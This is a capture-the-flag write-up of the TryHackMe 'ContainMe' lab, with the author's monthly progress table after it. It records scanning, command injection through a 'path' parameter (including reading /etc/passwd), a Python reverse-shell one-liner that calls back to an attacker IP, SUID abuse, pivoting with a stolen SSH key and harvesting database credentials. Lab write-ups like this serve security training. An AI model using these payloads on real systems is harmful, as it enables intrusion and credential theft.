<h1 align="center">ContainMe</h1>
<p align="center"><img width="80px" src="https://github.com/user-attachments/assets/625ecf77-c277-4a22-9273-ac5f7c16c3f0"><br>
2025, September 26<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>,<br>
and I’m excited to join you on this adventure, part of my <code>508</code>-day-streak in<a href="https://tryhackme.com"> TryHackMe</a>.<br>
<em>Where am I ? Catch me</em>.<br>
Access it <a href="https://tryhackme.com/room/containme1">here</a>.<br>
<img width="1200px" src="https://github.com/user-attachments/assets/06037d07-98a3-43e3-a4a3-420dc6a38f77"></p>


<h1 align="center">Task 1 . Find the flag</h1>
<p>Hack into me and look for the hidden flag. Look beyond the horizon.</p>

<p><em>Answer the question below</em></p>

<p>1.1. Read and move onto the next task for the challenge.<br>
<code>No answer needed</code></p>

<br>
<h1 align="center">Task 2 . Find the one and only flag</h1>

<p>Please deploy the target machine and wait 2-5 minutes for everything to start on the target machine.<br>

Good luck finding the flag!</p>

<p><em>Answer the question below</em></p>

<p>2.1. What is the flag?<br>
<code>THM{**************************}</code></p>

<br>
<h2 align="center">Port Scanning</h2>
<p align="center">22 : SSH<br>80 : HTTP : Apache 2.4.29<br>2222 : EtherNet/IP : EtherNetIP-1?<br>8022 : SSH : OpenSSH 8.2p1 Ubuntu 4ubuntu0.13ppa1+obfuscated~focal</p>

```bash
:~# nmap -sC -sV -p- xx.xxx.xx.xxx
...
PORT     STATE SERVICE       VERSION
22/tcp   open  tcpwrapped
| ssh-hostkey: 
...
80/tcp   open  tcpwrapped
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
2222/tcp open  EtherNetIP-1?
8022/tcp open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.13ppa1+obfuscated~focal (Ubuntu Linux; protocol 2.0)
```

<h2 align="center">Vulnerability Scanning</h2>
<p align="center"><code>OSVDB-3233</code> involves 💎 <code>Cross-Site Scripting (XSS)</code><br><code>OSVDB-5292</code> involves 💎 <code>Directory Listing vulnerability</code></p>

```bash
:~# nikto -h xx.xxx.xx.xxx
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          xx.xxx.xx.xxx
+ Target Hostname:    xx.xxx.xx.xxx
+ Target Port:        80
+ Start Time:         2025-09-26 xx:xx:xx (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.4.29 (Ubuntu)
+ Server leaks inodes via ETags, header found with file /, fields: 0x2aa6 0x5c730c0d1fa4e 
+ The anti-clickjacking X-Frame-Options header is not present.
+ Retrieved x-powered-by header: PHP/7.2.24-0ubuntu0.18.04.8
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Multiple index files found: index.php, index.html
+ Allowed HTTP Methods: POST, OPTIONS, HEAD, GET 
+ OSVDB-3233: /info.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information.
+ OSVDB-3233: /icons/README: Apache default file found.
+ OSVDB-5292: /info.php?file=http://cirt.net/rfiinc.txt?: RFI from RSnake's list (http://ha.ckers.org/weird/rfi-locations.dat) or from http://osvdb.org/
+ 6544 items checked: 0 error(s) and 8 item(s) reported on remote host
+ End Time:           2025-09-26 xx:xx:xx (GMT1) (9 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

<h2 align="center">Host Resolution</h2>

```bash
xx.xxx.xx.xxx containme.thm
```

<h2 align="center">Directory and File Enumeration/h2>
<p align="center"><code>/index.php</code><br><code>/index.php/login/</code><br><code>/info.php</code></p>

```bash
:~/Containme# dirsearch -u http://containme.thm/ -r -x 401,402,403,404

  _|. _ _  _  _  _ _|_    v0.4.3.post1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /root/Containme/reports/http_containme.thm/__xx-xx-xx_xx-xx-xx.txt

Target: http://containme.thm/

[xx:xx:xx] Starting: 
[xx:xx:xx] 200 -  175B  - /index.php
[xx:xx:xx] 200 -  175B  - /index.php/login/
Added to the queue: index.php/login/
[xx:xx:xx] 200 -   21KB - /info.php

[xx:xx:xx] Starting: index.php/login/

Task Completed
```

<img width="1128" height="223" alt="image" src="https://github.com/user-attachments/assets/c6a6a353-9a91-451e-af56-9e46bdd979ca" />

<br>
<br>
<h2 align="center">containme.thm/info.php</h2>
<p align="center">PHP Version, VARS and much more</em></p>

<br>
<br>

<h2 align="center">containme.thm/index.php</h2>
<p align="center">directory listing<br><em>--  where is the <code>path</code> ?  --</em><br>recalled nikto´s output<br></p>

<img width="1127" height="733" alt="image" src="https://github.com/user-attachments/assets/69c2e8cf-c9fa-441b-a788-f42a9f2e8008" />

<br>
<br>
<h2 align="center"><code>path</code></h2>

```bash

:~/Containme# ffuf -u http://containme.thm/index.php/?FUZZ=/l -w-w /usr/share/dirb/wordlists/common.txt -fs 100-203
...
path                           [Status: 200, Size: 1240, Words: 328, Lines: 34]
```

<h2 align="center">Command Execution<br><br>containme.thm/index.php?<code>path</code>=/</h2>

<img width="1125" height="402" alt="image" src="https://github.com/user-attachments/assets/0c066125-375d-4f12-814c-4fc51e14ff4b" />

<br>
<br>
<h2 align="center">hostname<br><br>containme.thm/index.php?<code>path</code>=/hostname</h2>
<p align="center">host1</p>

<img width="1130" height="343" alt="image" src="https://github.com/user-attachments/assets/b8cdca21-272f-496c-abac-8571e2c6243d" />

<br>
<br>
<h2 align="center">id<br><br>containme.thm/index.php?<code>path</code>=/id</h2>
<p align="center">uid=33(www-data) gid=33(www-data) groups=33(www-data)</p>

<img width="1125" height="229" alt="image" src="https://github.com/user-attachments/assets/d6f98967-76a9-4587-b9b4-6bdb8bf31a78" />

<br>
<br>
<h2 align="center">pwd<br><br>containme.thm/index.php?<code>path</code>=/pwd</h2>
<p align="center">/var/www/html</p>

<img width="1127" height="217" alt="image" src="https://github.com/user-attachments/assets/01089e3c-d006-48f6-9f4e-78f74f0238a5" />

<br>
<br>
<h2 align="center">python3<br><br>containme.thm/index.php?<code>path</code>=/which python3</h2>
<p align="center">🤔<br>/usr/bin/python3</p>

<img width="1129" height="223" alt="image" src="https://github.com/user-attachments/assets/48bcffb4-f289-42e4-8a0d-b29ea3dae000" />

<br>
<br>
<h2 align="center">home´s content<br><br>containme.thm/index.php?<code>path</code>=/home/</h2>
<p align="center">👤 mike</p>

<img width="1127" height="252" alt="image" src="https://github.com/user-attachments/assets/16a47200-12da-4077-b4b5-1a182a4fbd26" />

<br>
<br>
<h2 align="center">mike´s content<br><br>containme.thm/index.php?<code>path</code>=/home/mike/</h2>

<img width="1132" height="265" alt="image" src="https://github.com/user-attachments/assets/78285156-06ca-427f-96fe-b7b4bea86730" />

<br>
<br>
<p align="center">After discovering the previous contents, I tried guessing 👤 mike´s password using hydra against port 22 and 8022; unsuccessfully.</p>
<br>
<br>
<h2 align="center">Backtracking<br><br>containme.thm/index.php?<code>path</code>=../../../</h2>
<p align="center">recalled nikto´s output<br><br>😱</p>

<img width="1127" height="434" alt="image" src="https://github.com/user-attachments/assets/fa11e88e-d59d-4dec-9745-957740d959a3" />

<br>
<br>
<h2 align="center">users<br><br>containme.thm/index.php?<code>path</code>=<code>|</code> cat /etc/passwd | grep bash</h2>
<p align="center">Recalled nikto´s output<br>used <code>|</code> successfully<br>discovered root and mike<br>note: don´t forget the space after <code>|</code></p>

<img width="1127" height="179" alt="image" src="https://github.com/user-attachments/assets/568eda5a-b843-458e-8b0f-417ad5dc2302" />

<br>
<br>
<h2 align="center">Shell as www-data in host 1<br><br>containme.thm/index.php?<code>path</code>=<code>|</code> python3 -c<br> 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);<br>s.connect(("xx.xxx.xxx.xx",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);<br>os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'</h2>

<img width="1132" height="153" alt="image" src="https://github.com/user-attachments/assets/ec431316-1377-4d93-87cb-e8ced1803e8b" />

<br>
<br>
<h2 align="center">SUID executables</h2>
<p align="center">Identified files with the SUID (Set User ID) permission bit set.<br>These files execute with the privileges of their owner (root, daemon), rather than the privileges of the executing user (www-data).<br>Different! <code>/usr/share/man/zh_TW/crypt</code></p>

```bash
www-data@host1:/var/www/html$ find / -perm -4000 -ls 2>/dev/null
find / -perm -4000 -ls 2>/dev/null
   396515    352 -rwsr-xr-x   1 root     root       358668 Jul 30  2021 /usr/share/man/zh_TW/crypt
   131340     40 -rwsr-xr-x   1 root     root        37136 Nov 29  2022 /usr/bin/newuidmap
   131338     40 -rwsr-xr-x   1 root     root        37136 Nov 29  2022 /usr/bin/newgidmap
   131323     60 -rwsr-xr-x   1 root     root        59640 Nov 29  2022 /usr/bin/passwd
   131319     76 -rwsr-xr-x   1 root     root        76496 Nov 29  2022 /usr/bin/chfn
   137853     52 -rwsr-sr-x   1 daemon   daemon      51464 Feb 20  2018 /usr/bin/at
   131320     44 -rwsr-xr-x   1 root     root        44528 Nov 29  2022 /usr/bin/chsh
   131257     40 -rwsr-xr-x   1 root     root        40344 Nov 29  2022 /usr/bin/newgrp
   131329    148 -rwsr-xr-x   1 root     root       149080 Apr  4  2023 /usr/bin/sudo
   131322     76 -rwsr-xr-x   1 root     root        75824 Nov 29  2022 /usr/bin/gpasswd
   273337    100 -rwsr-xr-x   1 root     root       100760 Nov 22  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
   273412    128 -rwsr-xr-x   1 root     root       130264 May 29  2023 /usr/lib/snapd/snap-confine
   277451    428 -rwsr-xr-x   1 root     root       436552 Aug 11  2021 /usr/lib/openssh/ssh-keysign
   131380     44 -rwsr-xr--   1 root     messagebus    42992 Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
   135697     44 -rwsr-xr-x   1 root     root          43088 Sep 16  2020 /bin/mount
   134529     76 -rwsr-xr-x   1 root     root          74072 Aug 16  2021 /bin/ping
   131222     44 -rwsr-xr-x   1 root     root          44664 Nov 29  2022 /bin/su
   135737     28 -rwsr-xr-x   1 root     root          26696 Sep 16  2020 /bin/umount
   135675     32 -rwsr-xr-x   1 root     root          30800 Aug 11  2016 /bin/fusermount
   134530     64 -rwsr-xr-x   1 root     root          64888 Aug 16  2021 /bin/ping6
```

<br>

```bash
www-data@host1:/var/www/html$ /usr/share/man/zh_TW/crypt
```

```bash
www-data@host1:/usr/share/man/zh_TW$ ./crypt -h
```

```bash
www-data@host1:/usr/share/man/zh_TW$ ./crypt mike
```

<img width="1113" height="497" alt="image" src="https://github.com/user-attachments/assets/f38c6907-e348-42e1-a113-86f4c6837922" />

<br>
<br>

<img width="1110" height="370" alt="image" src="https://github.com/user-attachments/assets/8896ba87-9b05-4541-9c81-16321fc124d0" />

<br>
<br>
<h2 align="center">Vertical Privilege Escalation<br>Shell as root in host 1</h2>

<h2 align="center">Network Interface Configuration</h2>
<p align="center"><strong>eth1</strong> (xxx.xx.xx.⚪) is different from the IP of host 1.</p>

```bash
root@host1:/tmp# ifconfig
ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet xxx.xxx.xxx.xx netmask 255.255.255.0  broadcast xxx.xx.xx.xxx
        inet6 ...  prefixlen 64  scopeid 0x20<link>
        ether ...  txqueuelen 1000  (Ethernet)
        RX packets 736  bytes 10739891 (10.7 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 779  bytes 444886 (444.8 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet xxx.xx.xx.⚪ netmask 255.255.255.0  broadcast xxx.xx.xx.xxx
        inet6 ... prefixlen 64  scopeid 0x20<link>
        ether 00:16:3e:46:6b:29  txqueuelen 1000  (Ethernet)
        RX packets 37  bytes 2902 (2.9 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 30  bytes 2276 (2.2 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 205814  bytes 69189723 (69.1 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 205814  bytes 69189723 (69.1 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

<h2 align="center">Port Scanning  .  Internal</h2>

```bash
:~/Containme# wget https://github.com/opsec-infosec/nmap-static-binaries/releases/download/v2/nmap-x64.tar.gz
```

```bash
:~/Containme# python3 -m http.server
```

```bash
root@host1:/tmp# wget http://xx.xxx.xx.xxx:8000/nmap-x64.tar.gz     
```

```bash
root@host1:/tmp# tar -xzf nmap-x64.tar.gz 
```

```bash
root@host1:/tmp# ls
ls
full-scan.sh       nmap-payloads        nmap-x64.tar.gz  nselib
ncat               nmap-protocols       nmap.dtd         scan-port.sh
nmap               nmap-rpc             nmap.xsl         scan.sh
nmap-mac-prefixes  nmap-service-probes  nping            scripts
nmap-os-db         nmap-services        nse_main.lua
```

```bash
root@host1:/tmp# ./nmap -Pn xxx.xx.xx.0/24
...
Nmap scan report for ip-xxx-xx-xx-🔴.ec2.internal (xxx.xx.xx.🔴)
...
PORT   STATE SERVICE
22/tcp open  ssh
...
Nmap scan report for ip-xxx-xx-xx-⚪.ec2.internal (xxx.xx.xx.⚪)
...
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

<h2 align="center">Lateral Movement<br>Shell as mike in host 2</h2>

```bash
root@host1:/tmp# ssh -i /home/mike/.ssh/id_rsa mike@xxx.xx.xx.🔴
ssh -i /home/mike/.ssh/id_rsa mike@xxx.xx.xx.🔴
The authenticity of host 'xxx.xx.xx.🔴 (xxx.xx.xx.🔴)' can't be established.
ECDSA key fingerprint is SHA256:...
Are you sure you want to continue connecting (yes/no)? yes
yes
Warning: Permanently added 'xxx.xx.xx.🔴' (ECDSA) to the list of known hosts.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Mon Jul 19 20:23:18 2021 from xxx.xx.xx.🔴
mike@host2:~$
```

<h2 align="center">Socket Inspection</h2>
<p align="center"><strong>eth1</strong>Identified MySQL (port 3306).</p>

```bash
mike@host2:~$ ss -tulwn
ss -tulwn
Netid  State    Recv-Q   Send-Q      Local Address:Port     Peer Address:Port   
icmp6  UNCONN   0        0                  *%eth0:58                  *:*      
udp    UNCONN   0        0           127.0.0.53%lo:53            0.0.0.0:*      
tcp    LISTEN   0        128               0.0.0.0:22            0.0.0.0:*      
tcp    LISTEN   0        128         127.0.0.53%lo:53            0.0.0.0:*      
tcp    LISTEN   0        80              127.0.0.1:3306          0.0.0.0:*      
tcp    LISTEN   0        128                  [::]:22               [::]:*      
```

<h2 align="center">Database Authentication</h2>

```bash
mike@host2:~$ mysql -u mike -p
mysql -u mike -p
Enter password: xxxxxxxx

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 3
Server version: 5.7.34-0ubuntu0.18.04.1 (Ubuntu)

Copyright (c) 2000, 2021, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql>
```

<h2 align="center">Database Discovery</h2>

```bash
mysql> use accounts;
use accounts;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
```

```bash
mysql> show tables;
show tables;
+--------------------+
| Tables_in_accounts |
+--------------------+
| users              |
+--------------------+
1 row in set (0.00 sec)
```

```bash
mysql> select * from users;
+-------+---------------------+
| login | password            |
+-------+---------------------+
| root  | ****************    |
| mike  | ------------------- |
+-------+---------------------+
2 rows in set (0.00 sec)

mysql> exit
exit
Bye
mike@host2:~$
```

<h2 align="center">Lateral Movement<br>Shell as root in host 2</h2>

```bash
mike@host2:~$ su root
su root
Password: ****************

root@host2:/home/mike#
```

<img width="973" height="444" alt="image" src="https://github.com/user-attachments/assets/09e86d64-ff6d-42fe-85d2-52497ede8d1e" />

<br>
<br>

```bash
root@host2:/home/mike# cd /root
cd /root
```

```bash
root@host2:~# ls -a
ls -a
.  ..  .bash_history  .bashrc  .local  .profile  .ssh  mike.zip
```

```bash
root@host2:~# unzip mike.zip
unzip mike.zip
Archive:  mike.zip
[mike.zip] mike password: -------------------

 extracting: mike
```

```bash                   
root@host2:~# ls -a
ls -a
.  ..  .bash_history  .bashrc  .local  .profile  .ssh  mike  mike.zip
```

```bash
root@host2:~# cat mike
cat mike
THM{**************************}
```

<br>
<br>

<h1 align="center">Completed</h1>
<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/cbb7a941-cdb6-4fa5-b739-32c8dd4e4bcc"><br>
                  <img width="1200px" src="https://github.com/user-attachments/assets/80ddc0bd-debe-4cd7-9c34-11599775ec2a"></p>

<h1 align="center">My TryHackMe Journey ・ 2025, September</h1>

<div align="center"><h6>

| Date   | Room                                  |Streak   |All Time<br>Global|All Time<br>Brazil|Monthly<br>Global|Monthly<br>Brazil|Points|Rooms<br>Completed|Badges|
|:------:|:--------------------------------------|--------:|------------:|------------:|------------:|------------:|------------:|------------:|------------:|
|26      |Medium 🔗 - <strong>ContainMe</strong> | 508    |     109ᵗʰ    |      4ᵗʰ     |     301ˢᵗ    |     5ᵗʰ    | 127,304  |    978    |    76     |
|26      |Medium 🔗 - Sequence                   | 508    |     110ᵗʰ    |      4ᵗʰ     |     301ˢᵗ    |     5ᵗʰ    | 127,274  |    977    |    76     |
|25      |Medium 🔗 - Introduction to Honeypots  | 507    |     109ᵗʰ    |      4ᵗʰ     |     305ᵗʰ    |     5ᵗʰ    | 127,214  |    976    |    76     |
|25      |Medium 🔗 - Windows x64 Assembly       | 507    |     109ᵗʰ    |      4ᵗʰ     |     303ʳᵈ    |     5ᵗʰ    | 127,110  |    975    |    76     | 
|25      |Easy 🔗 - Network Secuity Essentials   | 507    |     112ⁿᵈ    |      4ᵗʰ     |     302ⁿᵈ    |     5ᵗʰ    | 126,990  |    974    |    76     | 
|24      |Medium 🔗 - Linux Threat Detection 1   | 506    |     110ᵗʰ    |      4ᵗʰ     |     330ᵗʰ    |     5ᵗʰ    | 126,894  |    973    |    76     | 
|24      |Hard 🚩 - Iron Corp                    | 506    |     111ˢᵗ    |      4ᵗʰ     |     363ʳᵈ    |     5ᵗʰ    | 126,768  |    972    |    76     |    
|23      |Medium 🔗 - Intro to Credential Harvesting|505  |     109ᵗʰ    |      4ᵗʰ     |     346ᵗʰ    |     5ᵗʰ    | 126,768  |    971    |    76     |    
|22      |                                        | 504   |              |      4ᵗʰ     |              |             |         |            |    76     |    
|21      |                                        | 503   |              |      4ᵗʰ     |              |             |         |            |    76     |    
|20      |                                        | 502   |              |      4ᵗʰ     |              |             |         |            |    76     |    
|19      |                                        | 501   |              |      4ᵗʰ     |              |             |         |            |    76     |        
|18      |Easy 🔗 - Detecting Web DDos           | 500    |     106ᵗʰ    |      4ᵗʰ     |     312ⁿᵈ    |     4ᵗʰ    | 126,674  |    970    |    76     |
|17      |Medium 🔗 - DLL Hijacking              | 499    |     106ᵗʰ    |      4ᵗʰ     |     348ᵗʰ    |     7ᵗʰ    | 126,554  |    969    |    75     |
|17      |Medium 🔗 - The Docker Rodeo           | 499    |     106ᵗʰ    |      4ᵗʰ     |     346ᵗʰ    |     7ᵗʰ    | 126,546  |    968    |    75     |
|17      |Easy 🔗 - Linux Logging for SOC        | 499    |     106ᵗʰ    |      4ᵗʰ     |     345ᵗʰ    |     7ᵗʰ    | 126,538  |    967    |    74     |
|16      |Hard 🚩 - TryHack3M: TriCipher Summit  | 498    |     107ᵗʰ    |      4ᵗʰ     |     364ᵗʰ    |     7ᵗʰ    | 126,420  |    966    |    74     |
|16      |Easy 🔗 - Chaining Vulnerabilities     | 498    |     108ᵗʰ    |      5ᵗʰ     |     365ᵗʰ    |     7ᵗʰ    | 126,420  |    965    |    74     |
|15      |Medium 🔗 - AppSec IR                  | 497    |     108ᵗʰ    |      5ᵗʰ     |     352ⁿᵈ    |     7ᵗʰ    | 126,404  |    964    |    74     |
|14      |Hard 🚩 - Misguided Ghosts, in progress| 496    |     108ᵗʰ    |      5ᵗʰ     |     389ᵗʰ    |     6ᵗʰ    | 126,300  |    963    |    74     |
|14      |Hard 🚩 - VulnNet: Endgame             | 496    |     108ᵗʰ    |      5ᵗʰ     |     394ᵗʰ    |     6ᵗʰ    | 126,270  |    963    |    74     |
|13      |Hard 🚩 - Royal Router                 | 495    |     107ᵗʰ    |      5ᵗʰ     |     388ᵗʰ    |     6ᵗʰ    | 126,160  |    962    |    74     |
|13      |Medium 🚩 - Void Execution             | 495    |     107ᵗʰ    |      5ᵗʰ     |     383ʳᵈ    |     6ᵗʰ    | 126,120  |    961    |    73     |
|12      |Easy 🚩 - Invite Only                  | 494    |     110ᵗʰ    |      5ᵗʰ     |     352ⁿᵈ    |     6ᵗʰ    | 126,056  |    960    |    73     |
|12      |Medium 🚩 - Devie                      | 494    |     110ᵗʰ    |      5ᵗʰ     |     607ᵗʰ    |     9ᵗʰ    | 125,606  |    959    |    73     |
|11      |Medium 🚩 - Backtrack, in progress     | 493    |     110ᵗʰ    |      5ᵗʰ     |     629ᵗʰ    |     9ᵗʰ    | 125,516  |    958    |    73     |
|11      |Easy 🔗 - Detecting Web Attacks        | 493    |     110ᵗʰ    |      5ᵗʰ     |     629ᵗʰ    |     9ᵗʰ    | 125,516  |    958    |    73     |
|10      |Easy 🔗 - Attacking ICS Plant #1       | 492    |     110ᵗʰ    |      5ᵗʰ     |     675ᵗʰ    |     9ᵗʰ    | 125,428  |    957    |    73     |
|10      |Easy 🔗 - SOC Role in Blue Team        | 492    |     110ᵗʰ    |      5ᵗʰ     |     664ᵗʰ    |     9ᵗʰ    | 125,292  |    956    |    73     |
|9       |Hard 🚩 - Python Playground            | 491    |     111ˢᵗ    |      5ᵗʰ     |     693ʳᵈ    |     9ᵗʰ    | 125,236  |    955    |    73     |
|9       |Hard 🚩 - Borderlands                  | 491    |     111ˢᵗ    |      5ᵗʰ     |     713ʳᵈ    |    10ᵗʰ    | 125,146  |    954    |    73     |
|9       |Medium 🚩 - Forgotten Implant          | 491    |     112ⁿᵈ    |      5ᵗʰ     |     660ᵗʰ    |    10ᵗʰ    | 125,016  |    953    |    73     |
|8       |Easy 🔗 - Web Enumeration              | 490    |     112ⁿᵈ    |      5ᵗʰ     |     663ʳᵈ    |    10ᵗʰ    | 124,986  |    952    |    73     |
|8       |Easy 🔗 - iOS: Forensics               | 490    |     113ʳᵈ    |      5ᵗʰ     |     548ᵗʰ    |     9ᵗʰ    | 124,850  |    951    |    73     |
|7       |Medium 🚩 - VulnNet: Active            | 489    |     114ᵗʰ    |      5ᵗʰ     |     542ⁿᵈ    |     9ᵗʰ    | 124,746  |    950    |    73     |
|7       |Medium 🚩 - pyLon                      | 489    |     114ᵗʰ    |      5ᵗʰ     |     535ᵗʰ    |     9ᵗʰ    | 124,716  |    949    |    73     |
|7       |Medium 🚩 - Pressed                    | 489    |     113ʳᵈ    |      5ᵗʰ     |     508ᵗʰ    |     9ᵗʰ    | 124,886  |    948    |    73     |
|6       |Easy 🚩 - Classic Passwd               | 488    |     114ᵗʰ    |      5ᵗʰ     |     683ʳᵈ    |    12ⁿᵈ    | 124,476  |    947    |    73     |
|6       |Medium 🚩 - toc2                       | 488    |     114ᵗʰ    |      5ᵗʰ     |     695ᵗʰ    |    12ⁿᵈ    | 124,446  |    946    |    73     |
|6       |Hard 🚩 - Extract                      | 488    |     114ᵗʰ    |      5ᵗʰ     |     716ᵗʰ    |    13ʳᵈ    | 124,386  |    945    |    73     |
|6       |Medium 🚩 - Plotted-EMR                | 488    |     114ᵗʰ    |      5ᵗʰ     |     844ᵗʰ    |    12ⁿᵈ    | 124,326  |    944    |    73     |
|5       |Medium 🚩 - Inferno                    | 487    |     114ᵗʰ    |      5ᵗʰ     |     758ᵗʰ    |    12ⁿᵈ    | 124,236  |    943    |    73     |
|5       |Easy 🔗 - Psycho Break                 | 487    |     115ᵗʰ    |      5ᵗʰ     |     724ᵗʰ    |    10ᵗʰ    | 124,152  |    942    |    73     |
|4       |Medium 🚩 - Cold VVars                 | 486    |     113ʳᵈ    |      5ᵗʰ     |     579ᵗʰ    |    10ᵗʰ    | 124,048  |    941    |    73     |
|4       |Medium 🔗 - IP and Domain Threat Intel | 486    |     113ʳᵈ    |	     5ᵗʰ    |     579ᵗʰ     |    10ᵗʰ    | 124,018  |   940     |    73     |
|3       |Easy 🔗 - Malware Classification       | 485    |     112ⁿᵈ    |      5ᵗʰ     |     714ᵗʰ    |    13ʳᵈ    | 123,882  |    939    |    73     |
|2       |Medium 🔗 - Session Forensics          | 484    |     111ˢᵗ    |      5ᵗʰ     |     706ᵗʰ    |    14ᵗʰ    | 123,786  |    938    |    73     |
|1       |Medium 🚩 - Voyage                     | 483    |     111ˢᵗ    |      5ᵗʰ     |     849ᵗʰ    |    15ᵗʰ    | 123,636  |    937    |    73     |

</h6></div><br>

<br>

<p align="center">Global All Time:   109ᵗʰ<br><img width="250px"  src="https://github.com/user-attachments/assets/51ae3808-7982-402f-b37c-2ecebedf7e64"><br>
                                              <img width="1200px" src="https://github.com/user-attachments/assets/8b51ae9e-665d-4c34-ab2f-ed965c4fa284"><br><br>
                  Brazil All Time:     4ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/f0b2d34d-8bce-4924-bf9e-842e21626077"><br>
                  Global monthly:     301ˢᵗ<br><img width="1200px" src="https://github.com/user-attachments/assets/05f34ba9-213d-4329-b0ab-ce10353e1461"><br>
                  Brazil monthly:      5ᵗʰ<br><img width="1200px" src="image" src="https://github.com/user-attachments/assets/bc820502-21aa-417a-bcd1-87ae0599b42d"><br>

<h1 align="center">Thanks for coming!</h1>
<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p>
